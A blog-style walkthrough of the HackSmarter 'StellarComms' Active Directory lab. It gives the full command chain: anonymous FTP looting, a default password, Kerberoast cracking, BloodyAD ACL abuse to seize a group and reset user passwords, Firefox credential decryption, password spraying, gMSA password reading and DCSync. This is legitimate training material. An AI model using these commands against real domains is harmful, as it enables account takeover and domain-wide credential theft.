---
title: "HackSmarter StellarComms Walkthrough  "
date: 2026-05-30 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---


<img width="1600" height="896" alt="image" src="https://github.com/user-attachments/assets/482f4e16-68de-437b-8b4d-12031d4793a6" />


## Scenario : 

Stellar Communications, a regional telecommunications provider, has retained the Hack Smarter Red Team to conduct a covert internal network penetration test. The client is concerned about the resilience of their internal Active Directory infrastructure against insider threats and compromised VPN endpoints.

Your objective is to simulate a compromised remote worker, pivot through the internal network, and demonstrate the ability to compromise high-value targets.


## Solution :

### FootHold :

We first start with out nmap scan : 

```bash
export target=10.1.240.197
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt
```

<img width="1340" height="741" alt="image" src="https://github.com/user-attachments/assets/19cf9bd5-6a86-4bdf-b113-2c534d42e2d3" />

First look at the nmap scan , we can tell this is a Domain Controller , we got kerberos , ldap and DNS as well , we also see an FTP server that allows anonymous login . Since this is an AD machine , i usually follow this quick checklist from my methdology : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```
Now first thing we should do is add the domain name as well as the hostname to our /etc/hosts file , we can use nxc to quickly generate it : 

<img width="1494" height="534" alt="image" src="https://github.com/user-attachments/assets/7b84ed01-6933-4442-abb5-a496094349bc" />

Then i tried checking anonymous access via nxc to get a list of usernames that we can try ASREPROASTING against , also tried listing shares anonymously : 

<img width="1342" height="758" alt="image" src="https://github.com/user-attachments/assets/ab2444c5-147d-4825-8766-cab2fd0a792c" />

But this didn't return anything useful either . Now let's check the ftp server first before moving to the web server : 

<img width="975" height="742" alt="image" src="https://github.com/user-attachments/assets/3904247e-4a2f-4d26-a341-0fbf84254636" />

We see 3 folders , i decided to download everything to look at it in details : 

```bash
==> To Download everything : Binary mode into disabling prompt then start your download . 
ftp> binary
ftp> prompt off
ftp> cd IT
ftp> mget *
ftp> cd Docs
ftp> mget *
```

<img width="1804" height="266" alt="image" src="https://github.com/user-attachments/assets/20019d88-5db5-4c05-a421-920ab50b6dd9" />

Now we find 3 reports , multiple pictures and 3 pdf files . 

==> Looking at the PDF files : 

1/ Browser policy file , we see that all employee are obliged to use Firefox only as their browser .

<img width="1081" height="664" alt="image" src="https://github.com/user-attachments/assets/094f498c-2d72-4869-a29f-fb0b895ca765" />

We should note this for later , if we get access to the machine , we can dump the user's firefox credentials that are stored and retrieve their password to spray it or something . 

2/ User Guide PDF : Upon opening the file , we get the default password for all new users "Galaxy123!" , we can use it with the intial user that we got and hopefully get our foothold this way . 

<img width="981" height="560" alt="image" src="https://github.com/user-attachments/assets/9ae5ad37-3634-4581-ace1-fd4e1a058db6" />

3/ White paper PDF : Nothing useful just general information about the company : 

<img width="950" height="589" alt="image" src="https://github.com/user-attachments/assets/491870b7-f4e1-4a7e-9563-956ddf50ed93" />

==> Looking at the Reports : We find a new subdomain , a portal for the company employees , we will note this for later . 

<img width="778" height="760" alt="image" src="https://github.com/user-attachments/assets/a2204825-be56-4c22-8278-8db2a1bbf43d" />

==> Checking the images : Nothing useful here, just satellite images.

Now let's try and authenticate using the default password and the username given to us . 

<img width="1057" height="421" alt="image" src="https://github.com/user-attachments/assets/4f6a5552-2345-4678-b5c7-65bab0ae34fd" />

Perfect , we got our foothold :) . Tried checking shares , but there are only default ones so i will leave it for now and test something else . 

Now that we have valid creds , we can test for Kerberoasting , and also we need to generate a list of valid usernames , we'll just keep it for later we might use it . 

<img width="1230" height="416" alt="image" src="https://github.com/user-attachments/assets/3073c53e-022e-408c-ac04-bfcc9b61a1b3" />

Tried Cracking the TGS with rockyou wordlist but that didn't work (John won't work against AES128 or higher , 256 in our case so we used Hashcat ) . 

```bash
hashcat -m 19700 hashesss /usr/share/wordlists/rockyou.txt
```

I checked if we could login via Winrm as the junior analyst but we're not part of the Remote managment group , so no WINRM access , from here we can only use BloodHound and hope we find some interesting ACLs that we can abuse . 

```bash
# To get the ZIP file :
nxc ldap $target -u 'junior.analyst' -p 'Galaxy123!' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```
<img width="1586" height="741" alt="image" src="https://github.com/user-attachments/assets/4f1a30cb-bec1-4e6f-8b59-d762cbf10e60" />

Looking at Bloodhound , we see that junior analyst user has WriteOwner over the STELLAROPS-CONTROL group , members of this group all have  Force Change Password rights ove the OPS.CONTROLLER user . 

<img width="1009" height="400" alt="image" src="https://github.com/user-attachments/assets/691ab2df-f589-409f-a764-c2985ade209a" />

Now the OPS Controller user doesn't have any Out Bound rightsover objects , but he is part of the Remote Management group which means he can connect via Winrm . 

<img width="1537" height="462" alt="image" src="https://github.com/user-attachments/assets/20ddb1f9-df13-4030-bcd7-a1f178447240" />

Perfect , now the Goal will be to add ourselves to the STELLAROPS-Control group ,to do this we can abuse the WriteOwner privilege to change the Group Owner to be the junior.analyst user , that way we can grant ourselves Generic All rights over the group so that we can add ourselves to the group , after that we can change the password for the user OPS.Controller and login via Winrm , from there we will see how we can elevate our privileges further . 

All of this can be done using BloodyAD : 

```bash
==> Change Group Owner to Junior.analyst : 
┌──(kali㉿kali)-[~/HackSmarter/StellarComms]
└─$ bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'junior.analyst' -p 'Galaxy123!' set owner 'STELLAROPS-CONTROL' 'junior.analyst'     
[!] S-1-5-21-1085439814-3345093241-3808503133-1103 is already the owner, no modification will be made

==> Grant ourselves GenricAll over the Group :
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HackSmarter/StellarComms]
└─$ bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'junior.analyst' -p 'Galaxy123!' add genericAll 'STELLAROPS-CONTROL' 'junior.analyst'   
[+] junior.analyst has now GenericAll on STELLAROPS-CONTROL

==> Add our user to the Group :                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HackSmarter/StellarComms]
└─$ bloodyad  --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'junior.analyst' -p 'Galaxy123!' add groupMember 'STELLAROPS-CONTROL' 'junior.analyst'   
[+] junior.analyst added to STELLAROPS-CONTROL
```
<img width="1779" height="499" alt="image" src="https://github.com/user-attachments/assets/ee5d7800-2ee6-4d35-bcb1-e836fd857165" />

Now we can change the User's password , again BloodyAD :) 

```bash
bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'junior.analyst' -p 'Galaxy123!' set password 'OPS.CONTROLLER' 'WEAK123.'
```

<img width="1553" height="727" alt="image" src="https://github.com/user-attachments/assets/8a9fc543-7669-47ce-9ad2-ea5bacffe896" />

Once we login the flag is found under the ops.controller Desktop . We also see the Firefox setup exe which is another indicator that there might be some credentials stored in the browser .


### Privilege Escalation : 

Now i looked online for where Firefox config files are stored and i found this : 

```bash
C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles
```

Now upon navigating to this folder , we find 2 profiles that exist : 

<img width="1295" height="396" alt="image" src="https://github.com/user-attachments/assets/360faa4c-4750-4a8b-a20f-b7d3316ab00b" />

First one is almost empty , second one contains a lot of data : 

<img width="1217" height="668" alt="image" src="https://github.com/user-attachments/assets/65972098-f0c3-4992-88f3-ed162860baf9" />

Now i searched online for ways to extract credentials from the config files .

Apprently Firefox holds creds in 2 separate files , first one contains the encrypted credentials , and second one holds the Key to decrypt them , The 2 files are logins.json and key4.db . 

I found this tool on github (firefox_decrypt) , it just needs the profile folder and it will do the extraction for us  : 

```bash
https://github.com/unode/firefox_decrypt/
```

Now first we need to import the profile back to our Kali machine , luckily for us we're connecting via Winrm so we can easily Download the entire thing using the Download command . 

```bash
==> First Compress the Folder : 
Compress-Archive -Path "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr" -DestinationPath "C:\Windows\Temp\ff.zip"

==> Download it via Winrm : 
download "C:\Windows\Temp\ff.zip"
```

<img width="1416" height="759" alt="image" src="https://github.com/user-attachments/assets/c1a72463-dac3-45d4-ae60-f43b4a7f2c83" />

Now back on our machine , first we clone the repository , then unzip the folder and run the tool :

```bash

==> Install the Tool : 
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt

==> Unzip the folder :
unzip ff.zip

==> Decrypt the passwords :
python3 firefox_decrypt.py ../v8mn7ijj.default-esr 
```

<img width="1439" height="326" alt="image" src="https://github.com/user-attachments/assets/e0082ff8-8e39-4f63-9eb6-76ff7b83a286" />

Perfect we found creds for the portal that we found at the beguinning , first thing we should always try is to spray this password across all the users on the domain . 

<img width="1615" height="462" alt="image" src="https://github.com/user-attachments/assets/4db80a6a-9668-4125-a811-00255d174b35" />

Perfect now we've got a new set of credentials , looking at BloodHound , this new user has Write DACL over the ENG.PAYLOAD user . 

<img width="1498" height="549" alt="image" src="https://github.com/user-attachments/assets/2e8a142c-286b-4679-ade9-b0937f73cfad" />

The ENG.payload user has Read GMSAPassword over the machine , which means Game over . All we have to do is read the password of a service account that can perfom a DCSync and that way we can dump all Hashes.

<img width="1458" height="484" alt="image" src="https://github.com/user-attachments/assets/dc760d18-3d66-4002-9752-856e4e84aad8" />

Now the goal once again here is pretty clear : 

Use  Write DACL over the Eng.payload user to grant ourselves GenericAll rights over the user --> Change that user's password --> Use the ENG.payload user to read the GSMA Password for that service (Luckily for us this service account can perform DCSync) .

```bash
==> Give Astro Genric all rights over Eng.payload : 
bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'astro.researcher' -p 'Cosmos@42' add genericAll 'ENG.PAYLOAD' 'astro.researcher'

==> Change ENG passowrd:
bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'astro.researcher' -p 'Cosmos@42' set password 'ENG.PAYLOAD' 'WEAK123.'
```
<img width="1847" height="732" alt="image" src="https://github.com/user-attachments/assets/805f76e5-16c9-408a-a254-63e5dc69c796" />

Perfect now to read the GMSA password (GMSA account is an AD account that handles the rotation of passwords for service accounts so that admins don't have to do it manually)

```bash
bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'eng.payload' -p 'WEAK123.' get object 'SERVICEACCOUNT$' --attr msDS-ManagedPassword
```
Now either we can use BloodyAD , or simply use nxc and it will dump the service account Hash . 

```bash
bloodyad --host DC-STELLAR.stellarcomms.local -d 'stellarcomms.local' -u 'eng.payload' -p 'WEAK123.' get object 'SATLINK-SERVICE$' --attr msDS-ManagedPassword
Or
nxc ldap $target -u 'eng.payload' -p 'WEAK123.' --gmsa
```

<img width="1900" height="721" alt="image" src="https://github.com/user-attachments/assets/61c107d8-046d-444a-8d77-29220c16a2a1" />

Now finally we can use the Hash to perform DCSync , either using impacket or nxc . 

<img width="1655" height="685" alt="image" src="https://github.com/user-attachments/assets/a08cb41e-ade0-4d20-b2b8-cf11075774de" />

Now finally , we just use the Administrator Hash and login via winrm to get our Flag . 

<img width="1434" height="686" alt="image" src="https://github.com/user-attachments/assets/da372762-ef61-445a-b955-d22cad4a2291" />

That was all for this lab , really enjoyed it and learnt a lot from it , see you in the next one :)

